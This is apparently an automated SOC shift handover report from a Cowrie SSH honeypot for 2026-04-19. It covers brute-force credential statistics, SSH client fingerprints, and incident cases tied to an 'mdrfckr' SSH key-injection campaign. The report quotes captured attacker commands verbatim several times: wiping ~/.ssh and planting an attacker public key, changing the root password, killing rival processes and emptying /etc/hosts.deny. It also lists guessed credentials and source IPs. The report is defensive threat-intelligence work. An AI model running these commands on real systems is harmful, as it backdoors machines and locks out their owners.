# 🛡 THIR · SOC Shift Handover Report

| Field | Value |
|---|---|
| **Report Date** | 2026-04-19 |
| **Generated At** | 2026-04-19T07:44:23Z |
| **Shift Time** | 07:44 UTC |
| **Honeypot Status** | ✅ HEALTHY |
| **Source** | Cowrie SSH Honeypot · AWS EC2 · Port 2222 |

---

## 📊 Executive Summary

| Metric | Value |
|---|---|
| Total Sessions Captured | **343** |
| Confirmed Threats | **340** |
| False Positives Filtered | **3** (0.9%) |
| Unique Attacker IPs | **22** |
| Countries of Origin | **10** |
| High Severity Cases | **128** |
| Medium Severity Cases | **0** |
| Low Severity Cases | **215** |
| Malware Samples Analyzed | **0** HIGH · **16** MED · 2 empty upload attempt(s) |

---

## 🔑 Credential Intelligence

| Metric | Value |
|---|---|
| Total Auth Attempts | **269** |
| Unique Credential Pairs | **98** |
| Unique Usernames | **40** |
| Unique Passwords | **95** |
| Successful Auth Pairs | **77** |

**Top Usernames:**

| Username | Attempts |
|---|---|
| `root` | 128 |
| `345gs5662d34` | 59 |
| `test` | 7 |
| `ubuntu` | 7 |
| `user` | 5 |

**Top Passwords:**

| Password | Attempts |
|---|---|
| `3245gs5662d34` | 61 |
| `345gs5662d34` | 59 |
| `123456` | 3 |
| `ken` | 2 |
| `dev12` | 2 |

**Top Credential Pairs:**

| Username | Password | Attempts |
|---|---|---|
| `root` | `3245gs5662d34` | 61 |
| `345gs5662d34` | `345gs5662d34` | 59 |
| `ken` | `ken` | 2 |
| `dev` | `dev12` | 2 |
| `git` | `Password1` | 2 |

**⚠️ Successful Auth Pairs (Priority — cross-reference with IR cases):**

| Username | Password | Source IP | Timestamp |
|---|---|---|---|
| `root` | `Admin2024..` | `106.12.161.149` | 2026-04-19T06:01:36 |
| `root` | `3245gs5662d34` | `106.12.161.149` | 2026-04-19T06:01:47 |
| `root` | `Root2019` | `210.14.142.89` | 2026-04-19T06:04:09 |
| `root` | `0990` | `14.18.113.233` | 2026-04-19T06:04:24 |
| `root` | `3245gs5662d34` | `14.18.113.233` | 2026-04-19T06:04:31 |
| `root` | `Cc123456` | `42.200.78.166` | 2026-04-19T06:04:39 |
| `root` | `3245gs5662d34` | `42.200.78.166` | 2026-04-19T06:04:43 |
| `root` | `admin123456789#` | `14.18.113.233` | 2026-04-19T06:04:47 |
| `root` | `zzXX000` | `14.18.113.233` | 2026-04-19T06:05:12 |
| `root` | `qwe123@` | `14.18.113.233` | 2026-04-19T06:07:48 |
| `root` | `Root1234567#` | `193.123.245.198` | 2026-04-19T06:07:48 |
| `root` | `3245gs5662d34` | `193.123.245.198` | 2026-04-19T06:07:52 |
| `root` | `pass12` | `210.14.142.89` | 2026-04-19T06:08:15 |
| `root` | `123QAZwsx` | `14.18.113.233` | 2026-04-19T06:08:57 |
| `root` | `pass12` | `14.18.113.233` | 2026-04-19T06:09:35 |
| `root` | `Fy123456` | `14.248.82.58` | 2026-04-19T06:10:50 |
| `root` | `3245gs5662d34` | `14.248.82.58` | 2026-04-19T06:10:53 |
| `root` | `root2020@#` | `193.123.245.198` | 2026-04-19T06:11:23 |
| `root` | `Cloud@2025` | `14.18.113.233` | 2026-04-19T06:12:16 |
| `root` | `qwe123asd` | `14.248.82.58` | 2026-04-19T06:12:26 |
| `root` | `qwe123@` | `210.14.142.89` | 2026-04-19T06:12:50 |
| `root` | `3245gs5662d34` | `210.14.142.89` | 2026-04-19T06:12:58 |
| `root` | `Root000` | `14.248.82.58` | 2026-04-19T06:14:03 |
| `root` | `Root1234567#` | `14.248.82.58` | 2026-04-19T06:18:53 |
| `root` | `Root123456@123` | `193.123.245.198` | 2026-04-19T06:21:51 |
| `root` | `Root123456@123` | `14.248.82.58` | 2026-04-19T06:22:14 |
| `root` | `Admin123#` | `119.209.12.20` | 2026-04-19T06:22:24 |
| `root` | `3245gs5662d34` | `119.209.12.20` | 2026-04-19T06:22:28 |
| `root` | `Root000` | `193.123.245.198` | 2026-04-19T06:23:38 |
| `root` | `123456tT` | `14.248.82.58` | 2026-04-19T06:24:05 |
| `root` | `As123456.` | `193.123.245.198` | 2026-04-19T06:27:00 |
| `root` | `Pp123456` | `193.123.245.198` | 2026-04-19T06:28:45 |
| `root` | `root12345!@` | `14.248.82.58` | 2026-04-19T06:29:02 |
| `root` | `Ta123456` | `119.209.12.20` | 2026-04-19T06:33:47 |
| `root` | `As123456.` | `14.248.82.58` | 2026-04-19T06:33:53 |
| `root` | `root12345!@` | `193.123.245.198` | 2026-04-19T06:33:59 |
| `root` | `Abcd12345678!!` | `181.45.193.221` | 2026-04-19T06:35:02 |
| `root` | `3245gs5662d34` | `181.45.193.221` | 2026-04-19T06:35:10 |
| `root` | `root2020@#` | `14.248.82.58` | 2026-04-19T06:35:34 |
| `root` | `qwe123asd` | `193.123.245.198` | 2026-04-19T06:35:52 |
| `root` | `qazwsx2025@#` | `119.209.12.20` | 2026-04-19T06:38:55 |
| `root` | `P@SSw0rd` | `138.84.41.136` | 2026-04-19T06:40:16 |
| `root` | `3245gs5662d34` | `138.84.41.136` | 2026-04-19T06:40:23 |
| `root` | `root2026` | `119.209.12.20` | 2026-04-19T06:40:34 |
| `root` | `Pp123456` | `14.248.82.58` | 2026-04-19T06:40:36 |
| `root` | `123456tT` | `193.123.245.198` | 2026-04-19T06:41:05 |
| `root` | `AAxx1234` | `116.193.190.100` | 2026-04-19T06:41:19 |
| `root` | `3245gs5662d34` | `116.193.190.100` | 2026-04-19T06:41:24 |
| `root` | `Welcome2026!` | `138.84.41.136` | 2026-04-19T06:41:48 |
| `root` | `QWE!123456` | `119.209.12.20` | 2026-04-19T06:42:18 |
| `root` | `zzQQ000` | `116.193.190.100` | 2026-04-19T06:43:12 |
| `root` | `root12345678!@` | `138.84.41.136` | 2026-04-19T06:43:19 |
| `root` | `Zxcvb123456` | `138.84.41.136` | 2026-04-19T06:44:03 |
| `root` | `Fy123456` | `193.123.245.198` | 2026-04-19T06:46:13 |
| `root` | `Welcome2026!` | `116.193.190.100` | 2026-04-19T06:46:44 |
| `root` | `root4321..` | `138.84.41.136` | 2026-04-19T06:46:59 |
| `root` | `DDbb111` | `138.84.41.136` | 2026-04-19T06:47:50 |
| `root` | `Admin123$` | `138.84.41.136` | 2026-04-19T06:48:38 |
| `root` | `A123456Z` | `119.209.12.20` | 2026-04-19T06:48:51 |
| `root` | `P@SSw0rd` | `116.193.190.100` | 2026-04-19T06:50:12 |
| `root` | `ZZbb111` | `119.209.12.20` | 2026-04-19T06:50:33 |
| `root` | `qwe123456@` | `138.84.41.136` | 2026-04-19T06:51:02 |
| `root` | `amir@123` | `138.84.41.136` | 2026-04-19T06:51:49 |
| `root` | `AAxx1234` | `138.84.41.136` | 2026-04-19T06:52:34 |
| `root` | `zzQQ000` | `138.84.41.136` | 2026-04-19T06:53:20 |
| `root` | `zz0000` | `119.209.12.20` | 2026-04-19T06:53:53 |
| `root` | `1qaz2wsx..` | `138.84.41.136` | 2026-04-19T06:54:54 |
| `root` | `951753` | `119.209.12.20` | 2026-04-19T06:55:37 |
| `root` | `root12345678!@` | `116.193.190.100` | 2026-04-19T06:57:12 |
| `root` | `Zxcvb123456` | `116.193.190.100` | 2026-04-19T06:58:59 |
| `root` | `root4321..` | `116.193.190.100` | 2026-04-19T07:07:44 |
| `root` | `1qaz2wsx..` | `116.193.190.100` | 2026-04-19T07:09:26 |
| `root` | `amir@123` | `116.193.190.100` | 2026-04-19T07:11:12 |
| `root` | `DDbb111` | `116.193.190.100` | 2026-04-19T07:13:02 |
| `root` | `qwe123456@` | `116.193.190.100` | 2026-04-19T07:18:25 |
| `root` | `Admin123$` | `116.193.190.100` | 2026-04-19T07:20:12 |
| `root` | `------fuck------` | `221.226.31.137` | 2026-04-19T07:29:55 |

---

## 🖥 SSH Fingerprint Intelligence

| Metric | Value |
|---|---|
| Total Sessions Parsed | **343** |
| Sessions with Fingerprint | **3** |
| Unique HASSH Fingerprints | **3** |

**Client Family Distribution:**

| Client Family | Sessions |
|---|---|
| libssh | 334 |
| Go SSH scanner | 1 |

**⚠️ Botnet/Scanner KEX Signatures Detected:**

| HASSH | Signature | Sessions | IPs |
|---|---|---|---|
| `03a80b21afa8...` | Modern SSH client | 332 | 14 |
| `98f63c4d9c87...` | Generic scanner | 1 | 1 |

**Top Fingerprints:**

| HASSH | Client | Sessions | IPs | Botnet Sig |
|---|---|---|---|---|
| `03a80b21afa8...` | libssh | 332 | 14 | Modern SSH client |
| `95420f9d932d...` | libssh | 2 | 1 | — |
| `98f63c4d9c87...` | Go SSH scanner | 1 | 1 | Generic scanner |

---

## ⚔️ Attack Campaign Intelligence

| Metric | Value |
|---|---|
| Total Command Clusters | **3** |
| Campaign Clusters | **2** |
| Highest Severity | **HIGH** |

**Active Campaigns:**

| Campaign | Severity | Sessions | IPs | TTPs |
|---|---|---|---|---|
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 5 | 2 | `T1021.004, T1078, T1083, T1082` |
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 61 | 10 | `T1021.004, T1078, T1070, T1140` |

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
```
cat /proc/cpuinfo | grep name | wc -l
```
```
echo "root:eqVKZtPY85OY"|chpasswd|bash
```
```
rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;
```
Source IPs: `210.14.142.89`, `14.18.113.233`

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
Source IPs: `210.14.142.89`, `14.18.113.233`, `193.123.245.198`, `119.209.12.20`, `181.45.193.221`, `42.200.78.166`

---

## 🌐 ASN Cluster Intelligence

| Metric | Value |
|---|---|
| Total IPs Analysed | **22** |
| Unique ASNs | **21** |
| High-Risk ASNs | **18** |
| Anon Infrastructure ASNs | **0** |

**Top Attack ASNs:**

| ASN | Provider | IPs | Risk |
|---|---|---|---|
| `AS38365` | Beijing Baidu Netcom Science and Technology Co., Ltd. | 2 | HIGH |
| `AS396982` | Google LLC | 1 | LOW |
| `AS58466` | CHINANET Guangdong province network | 1 | HIGH |
| `AS37963` | Hangzhou Alibaba Advertising Co.,Ltd. | 1 | HIGH |
| `AS56019` | Beijing ShuJuJia Technology Co., Ltd. | 1 | HIGH |
| `AS55990` | Huawei Cloud Service data center | 1 | MEDIUM |
| `AS56045` | China Mobile communications corporation | 1 | HIGH |
| `AS14593` | Space Exploration Technologies Corporation | 1 | HIGH |

---

---

## 🚨 Priority Cases — Immediate Attention (128)

> Cases with auth success, command execution, or file downloads.
> Each requires individual review. Never grouped.

### 🔴 HIGH · IR-b63955bb7fd0

| Field | Detail |
|---|---|
| **Source IP** | `106.12.161[.]149` |
| **First Seen** | 2026-04-19 06:01 |
| **Last Seen** | 2026-04-19 06:01 |
| **Session Duration** | 12s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-19 06:01:34` | `cowrie.session.connect` |
| `2026-04-19 06:01:34` | `cowrie.client.version` |
| `2026-04-19 06:01:35` | `cowrie.client.kex` |
| `2026-04-19 06:01:36` | `cowrie.login.success` |
| `2026-04-19 06:01:36` | `cowrie.session.params` |
| `2026-04-19 06:01:36` | `cowrie.command.input` |
| `2026-04-19 06:01:36` | `cowrie.command.failed` |
| `2026-04-19 06:01:37` | `cowrie.log.closed` |
| `2026-04-19 06:01:38` | `cowrie.session.params` |
| `2026-04-19 06:01:38` | `cowrie.command.input` |
| `2026-04-19 06:01:39` | `cowrie.session.file_download` |
| `2026-04-19 06:01:39` | `cowrie.log.closed` |
| `2026-04-19 06:01:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `106.12.161[.]149` to AbuseIPDB if not already reported
- [ ] Block `106.12.161[.]149` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-28816bb8c1e3

| Field | Detail |
|---|---|
| **Source IP** | `106.12.161[.]149` |
| **First Seen** | 2026-04-19 06:01 |
| **Last Seen** | 2026-04-19 06:01 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-19 06:01:44` | `cowrie.session.connect` |
| `2026-04-19 06:01:44` | `cowrie.client.version` |
| `2026-04-19 06:01:44` | `cowrie.client.kex` |
| `2026-04-19 06:01:47` | `cowrie.login.success` |
| `2026-04-19 06:01:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `106.12.161[.]149` to AbuseIPDB if not already reported
- [ ] Block `106.12.161[.]149` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8bbc9a0e0cc2

| Field | Detail |
|---|---|
| **Source IP** | `210.14.142[.]89` |
| **First Seen** | 2026-04-19 06:04 |
| **Last Seen** | 2026-04-19 06:04 |
| **Session Duration** | 21s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~, cat /proc/cpuinfo | grep name | wc -l, echo "root:eqVKZtPY85OY"|chpasswd|bash, rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2, 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW), 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1053.003 · T1057 · T1059.004 · T1078 · T1083 · T1105 · T1489 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-19 06:04:08` | `cowrie.session.connect` |
| `2026-04-19 06:04:08` | `cowrie.client.version` |
| `2026-04-19 06:04:09` | `cowrie.client.kex` |
| `2026-04-19 06:04:09` | `cowrie.login.success` |
| `2026-04-19 06:04:10` | `cowrie.session.params` |
| `2026-04-19 06:04:10` | `cowrie.command.input` |
| `2026-04-19 06:04:10` | `cowrie.command.failed` |
| `2026-04-19 06:04:10` | `cowrie.log.closed` |
| `2026-04-19 06:04:10` | `cowrie.session.params` |
| `2026-04-19 06:04:10` | `cowrie.command.input` |
| `2026-04-19 06:04:10` | `cowrie.session.file_download` |
| `2026-04-19 06:04:10` | `cowrie.log.closed` |
| `2026-04-19 06:04:23` | `cowrie.session.params` |
| `2026-04-19 06:04:23` | `cowrie.command.input` |
| `2026-04-19 06:04:23` | `cowrie.log.closed` |
| `2026-04-19 06:04:23` | `cowrie.session.params` |
| `2026-04-19 06:04:23` | `cowrie.command.input` |
| `2026-04-19 06:04:23` | `cowrie.log.closed` |
| `2026-04-19 06:04:23` | `cowrie.session.params` |
| `2026-04-19 06:04:23` | `cowrie.command.input` |
| `2026-04-19 06:04:24` | `cowrie.session.file_download` |
| `2026-04-19 06:04:24` | `cowrie.log.closed` |
| `2026-04-19 06:04:24` | `cowrie.session.params` |
| `2026-04-19 06:04:24` | `cowrie.command.input` |
| `2026-04-19 06:04:24` | `cowrie.log.closed` |
| `2026-04-19 06:04:24` | `cowrie.session.params` |
| `2026-04-19 06:04:24` | `cowrie.command.input` |
| `2026-04-19 06:04:25` | `cowrie.log.closed` |
| `2026-04-19 06:04:25` | `cowrie.session.params` |
| `2026-04-19 06:04:25` | `cowrie.command.input` |
| `2026-04-19 06:04:25` | `cowrie.command.input` |
| `2026-04-19 06:04:25` | `cowrie.log.closed` |
| `2026-04-19 06:04:26` | `cowrie.session.params` |
| `2026-04-19 06:04:26` | `cowrie.command.input` |
| `2026-04-19 06:04:26` | `cowrie.log.closed` |
| `2026-04-19 06:04:26` | `cowrie.session.params` |
| `2026-04-19 06:04:26` | `cowrie.command.input` |
| `2026-04-19 06:04:26` | `cowrie.log.closed` |
| `2026-04-19 06:04:27` | `cowrie.session.params` |
| `2026-04-19 06:04:27` | `cowrie.command.input` |
| `2026-04-19 06:04:27` | `cowrie.log.closed` |
| `2026-04-19 06:04:27` | `cowrie.session.params` |
| `2026-04-19 06:04:27` | `cowrie.command.input` |
| `2026-04-19 06:04:27` | `cowrie.log.closed` |
| `2026-04-19 06:04:28` | `cowrie.session.params` |
| `2026-04-19 06:04:28` | `cowrie.command.input` |
| `2026-04-19 06:04:28` | `cowrie.log.closed` |
| `2026-04-19 06:04:28` | `cowrie.session.params` |
| `2026-04-19 06:04:28` | `cowrie.command.input` |
| `2026-04-19 06:04:28` | `cowrie.log.closed` |
| `2026-04-19 06:04:29` | `cowrie.session.params` |
| `2026-04-19 06:04:29` | `cowrie.command.input` |
| `2026-04-19 06:04:29` | `cowrie.log.closed` |
| `2026-04-19 06:04:29` | `cowrie.session.params` |
| `2026-04-19 06:04:29` | `cowrie.command.input` |
| `2026-04-19 06:04:29` | `cowrie.log.closed` |
| `2026-04-19 06:04:30` | `cowrie.session.params` |
| `2026-04-19 06:04:30` | `cowrie.command.input` |
| `2026-04-19 06:04:30` | `cowrie.log.closed` |
| `2026-04-19 06:04:30` | `cowrie.session.params` |
| `2026-04-19 06:04:30` | `cowrie.command.input` |
| `2026-04-19 06:04:30` | `cowrie.log.closed` |
| `2026-04-19 06:04:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `210.14.142[.]89` to AbuseIPDB if not already reported
- [ ] Block `210.14.142[.]89` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e8b4f06863d2

| Field | Detail |
|---|---|
| **Source IP** | `14.18.113[.]233` |
| **First Seen** | 2026-04-19 06:04 |
| **Last Seen** | 2026-04-19 06:04 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-19 06:04:22` | `cowrie.session.connect` |
| `2026-04-19 06:04:22` | `cowrie.client.version` |
| `2026-04-19 06:04:22` | `cowrie.client.kex` |
| `2026-04-19 06:04:24` | `cowrie.login.success` |
| `2026-04-19 06:04:24` | `cowrie.session.params` |
| `2026-04-19 06:04:24` | `cowrie.command.input` |
| `2026-04-19 06:04:24` | `cowrie.command.failed` |
| `2026-04-19 06:04:24` | `cowrie.log.closed` |
| `2026-04-19 06:04:25` | `cowrie.session.params` |
| `2026-04-19 06:04:25` | `cowrie.command.input` |
| `2026-04-19 06:04:25` | `cowrie.session.file_download` |
| `2026-04-19 06:04:25` | `cowrie.log.closed` |
| `2026-04-19 06:04:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `14.18.113[.]233` to AbuseIPDB if not already reported
- [ ] Block `14.18.113[.]233` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4ccd48601042

| Field | Detail |
|---|---|
| **Source IP** | `14.18.113[.]233` |
| **First Seen** | 2026-04-19 06:04 |
| **Last Seen** | 2026-04-19 06:04 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-19 06:04:29` | `cowrie.session.connect` |
| `2026-04-19 06:04:29` | `cowrie.client.version` |
| `2026-04-19 06:04:30` | `cowrie.client.kex` |
| `2026-04-19 06:04:31` | `cowrie.login.success` |
| `2026-04-19 06:04:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `14.18.113[.]233` to AbuseIPDB if not already reported
- [ ] Block `14.18.113[.]233` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2074b7fb5716

| Field | Detail |
|---|---|
| **Source IP** | `42.200.78[.]166` |
| **First Seen** | 2026-04-19 06:04 |
| **Last Seen** | 2026-04-19 06:04 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-19 06:04:39` | `cowrie.session.connect` |
| `2026-04-19 06:04:39` | `cowrie.client.version` |
| `2026-04-19 06:04:39` | `cowrie.client.kex` |
| `2026-04-19 06:04:39` | `cowrie.login.success` |
| `2026-04-19 06:04:40` | `cowrie.session.params` |
| `2026-04-19 06:04:40` | `cowrie.command.input` |
| `2026-04-19 06:04:40` | `cowrie.command.failed` |
| `2026-04-19 06:04:40` | `cowrie.log.closed` |
| `2026-04-19 06:04:40` | `cowrie.session.params` |
| `2026-04-19 06:04:40` | `cowrie.command.input` |
| `2026-04-19 06:04:40` | `cowrie.session.file_download` |
| `2026-04-19 06:04:40` | `cowrie.log.closed` |
| `2026-04-19 06:04:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `42.200.78[.]166` to AbuseIPDB if not already reported
- [ ] Block `42.200.78[.]166` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9ec1a0b1bf0f

| Field | Detail |
|---|---|
| **Source IP** | `42.200.78[.]166` |
| **First Seen** | 2026-04-19 06:04 |
| **Last Seen** | 2026-04-19 06:04 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-19 06:04:43` | `cowrie.session.connect` |
| `2026-04-19 06:04:43` | `cowrie.client.version` |
| `2026-04-19 06:04:43` | `cowrie.client.kex` |
| `2026-04-19 06:04:43` | `cowrie.login.success` |
| `2026-04-19 06:04:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `42.200.78[.]166` to AbuseIPDB if not already reported
- [ ] Block `42.200.78[.]166` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5878ca0f78cf

| Field | Detail |
|---|---|
| **Source IP** | `14.18.113[.]233` |
| **First Seen** | 2026-04-19 06:04 |
| **Last Seen** | 2026-04-19 06:04 |
| **Session Duration** | 12s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
